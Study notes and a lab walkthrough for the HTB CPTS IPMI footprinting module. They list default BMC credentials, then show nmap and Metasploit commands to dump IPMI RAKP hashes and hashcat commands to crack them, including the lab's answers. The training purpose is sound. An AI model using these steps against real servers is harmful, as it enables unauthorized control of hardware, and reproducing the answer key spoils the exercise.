### CPTS / HTB Penetration Tester Path <br>
### Footprinting - IPMI <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### IPMI Footprinting



IPMI — out-of-band hardware management. UDP/623. BMCs (Baseboard Mgmt Controllers) implement it; embedded ARM Linux on the motherboard. Access ≈ physical access to the host.

Common BMCs: HP iLO, Dell iDRAC, Supermicro IPMI. They expose a web console, SSH/Telnet, and the IPMI port.

Default creds worth trying first:

| Product | Username | Password |
|---|---|---|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | random 8-char alphanum |
| Supermicro IPMI | ADMIN | ADMIN |

IPMI 2.0 RAKP flaw — server sends salted SHA1/MD5 hash of the user's password BEFORE auth. Crackable offline.

Nmap version scan via NSE script:

```diff
+ $ sudo nmap -sU --script ipmi-version -p 623 <target>
```

Metasploit version scan:

```diff
+ msf6 > use auxiliary/scanner/ipmi/ipmi_version
+ msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts <target>
+ msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```

Dump RAKP hashes:

```diff
+ msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
+ msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts <target>
+ msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```

Crack with hashcat (mode 7300 = IPMI2 RAKP HMAC-SHA1):

```diff
+ $ hashcat -m 7300 hashes.txt rockyou.txt
```

For HP iLO factory passwords (8-char [A-Z0-9]):

```diff
+ $ hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

<br>

---

<br>

### IPMI Exercise

IP: 10.129.202.5

---

### Question 1:
What username is configured for accessing the host via IPMI?

```diff
+ $ sudo nmap -sU --script=ipmi-version -p 623 10.129.202.5
```

	623/udp open  asf-rmcp
	UserAuth: password, md5, md2, null

#### Then dump hashes via MSF:

```diff
+ msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
+ msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.202.5
+ msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > exploit
```

	[+] 10.129.202.5:623 - IPMI - Hash found: admin:bf45...:f88241e866d9ca37d36c7b9dd5e65ec639408620

&#x1F6A9; found user **adm--edit--in**.

---

### Question 2:
What is the account's cleartext password?

#### Saved hash to `hashbrown.txt` and ran hashcat:

```diff
+ $ hashcat -m 7300 hashbrown.txt rockyou.txt
```

	bf45...:f88241e866d9ca37d36c7b9dd5e65ec639408620:trinity

&#x1F6A9; found **tri--edit--nity**.
